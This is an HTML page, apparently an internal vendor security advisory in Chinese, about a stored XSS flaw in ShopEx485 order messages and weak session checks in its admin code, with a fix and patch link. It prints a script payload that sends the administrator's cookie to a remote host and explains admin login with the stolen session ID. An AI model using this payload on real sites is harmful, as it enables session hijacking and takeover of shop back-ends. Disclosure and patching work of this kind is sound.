<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<META NAME="generator" CONTENT="http://txt2tags.sf.net">
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<LINK REL="stylesheet" TYPE="text/css" HREF="http://shopexts.googlecode.com/files/t2t.css">
<TITLE>ShopEx485订单留言XSS漏洞</TITLE>
</HEAD>
<BODY>

<DIV CLASS="header" ID="header">
<H1>ShopEx485订单留言XSS漏洞</H1>
<H2>last modify 2010-08-11 00:55:47 Wednesday</H2>
</DIV>

<DIV CLASS="body" ID="body">
<H4>添加时间</H4>
<P>
2010-07-26
</P>
<H4>系统编号</H4>
<P>
SEC-0726-01
</P>
<H4>影响版本</H4>
<P>
ShopEx485 &gt;= 38669
</P>
<H4>漏洞危害</H4>
<P>
劫持正常管理员的会话，非法登录后台
</P>
<H4>漏洞原理</H4>
<P>
1）XSS
</P>
<P>
前台会员中心的订单留言输出没有过滤，注册用户购买商品后，进入会员中心，在订单留言中提交这样的留言内容来获取到管理员的cookie 
</P>
<PRE>
&lt;script&gt;document.write('&lt;img width=0 height=0 src=http://www.remote.com/record.php?cookies='+document.cookie+' /&gt;');&lt;/script&gt;
</PRE>
<P></P>
<P>
也可以简单提交
</P>
<PRE>
&lt;script&gt;alert('hi');&lt;/script&gt;
</PRE>
<P></P>
<P>
这些js代码写入数据库或者输出到页面的时候都没有转义，可以在页面中正常执行，登录后台查看这样的留言，应该可以看到弹出框。
</P>
<P>
2）CSRF
</P>
<P>
在core/include/adminCore.php没有对客户端做验证。 
</P>
<PRE>
        }elseif($_COOKIE['SHOPEX_SID']){
            $this-&gt;sess_id = $_COOKIE['SHOPEX_SID'];
        }else{
</PRE>
<P></P>
<P>
代码仅判断$_COOKIE['SHOPEX_SID'])是否有值，而没有判断它是否是来自同一个浏览器，恶意用户可以用窃取来的'SHOPEX_SID'登录后台。
</P>
<H4>检测方法</H4>
<P>
无
</P>
<H4>解决方案</H4>
<P>
1） XSS，用户的输入信息在入库前转义掉
2） CSRF，结合SESSION，在session中放置标识用户身份的字串，类似这样的：
</P>
<PRE>
$chk = @md5(
        $_SERVER['HTTP_ACCEPT_CHARSET'] . 
        $_SERVER['HTTP_ACCEPT_ENCODING'] .
        $_SERVER['HTTP_ACCEPT_LANGUAGE'] .
        $_SERVER['HTTP_USER_AGENT']);                                 
 
if (empty($_SESSION))
        $_SESSION['key'] = $chk;
else if ($_SESSION['key'] != $chk) 
        session_destroy();
 
……后续正常的代码

</PRE>
<P></P>
<P>
主线版本补丁：
</P>
<PRE>
http://downtcom.shopex.cn/update/sec100726-01-42355-45144.zip 
</PRE>
<P></P>
<H4>信息来源</H4>
<PRE>
http://nod32.5151shop.com/?p=860
</PRE>
<P></P>
<H4>注意事项</H4>
<OL>
<LI>主线版本将在shopex485版本的7号补丁中集成该漏洞的补丁。绿保服务部门的同仁要及时给prima上的用户打上补丁。
<LI>平台部saas系统请自行检查在前台用户输入点是否有问题（留言，商品评论，商品咨询，订单留言，订单填写页备注，售后服务申请等），如有问题，请反馈到我处报备，修补方案自定
<LI>B2B平台操作方法同平台部。
<LI>大客户部将根据项目实际情况自行修改，如有技术疑问可以直接咨询企业开发部的陈磊，或者我也可以的 ：）
<P></P>
</OL>

</DIV>

<!-- html code generated by txt2tags 2.5 (http://txt2tags.sf.net) -->
<!-- cmdline: txt2tags -\-target=html -\-infile=t2t/sec10072601.t2t -\-outfile=htdocs/sec10072601.html -->
</BODY></HTML>
